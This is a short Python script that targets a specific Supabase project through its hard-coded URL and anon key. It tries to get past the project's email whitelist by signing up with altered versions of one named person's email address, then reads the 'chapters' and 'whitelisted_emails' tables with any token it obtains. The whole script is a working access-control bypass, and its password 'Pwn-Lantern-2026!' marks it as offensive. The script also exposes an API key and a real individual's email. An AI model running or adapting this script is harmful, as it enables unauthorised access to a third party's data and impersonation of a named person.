import urllib.request, urllib.error, ssl, json, time

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()
def req(method, path, body=None, token=None):
    r=urllib.request.Request(f"{BASE}{path}", data=(json.dumps(body).encode() if body is not None else None), method=method,
        headers={"apikey":ANON,"Authorization":f"Bearer {token or ANON}","Content-Type":"application/json","Accept":"application/json"})
    try:
        resp=urllib.request.urlopen(r,timeout=25,context=ctx); return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return "ERR", str(e)

variants=["D.Vitali@reply.it","d.vitali@Reply.it","d.vitali@reply.IT","D.VITALI@REPLY.IT",
          "d.vitali@reply.it.","d.vitali+1@reply.it"," d.vitali@reply.it"]
for v in variants:
    s,o=req("POST","/auth/v1/signup",{"email":v,"password":"Pwn-Lantern-2026!"})
    tok=None
    try: tok=json.loads(o).get("access_token")
    except: pass
    note=""
    if tok:
        sc,co=req("GET","/rest/v1/chapters?select=*",token=tok)
        sc2,co2=req("GET","/rest/v1/whitelisted_emails?select=*",token=tok)
        note=f" | chapters:{co[:120]} | wl:{co2[:120]}"
    print(f"{v!r:28} signup={s} token={bool(tok)}{note}")
    print(f"      {o[:160]}")
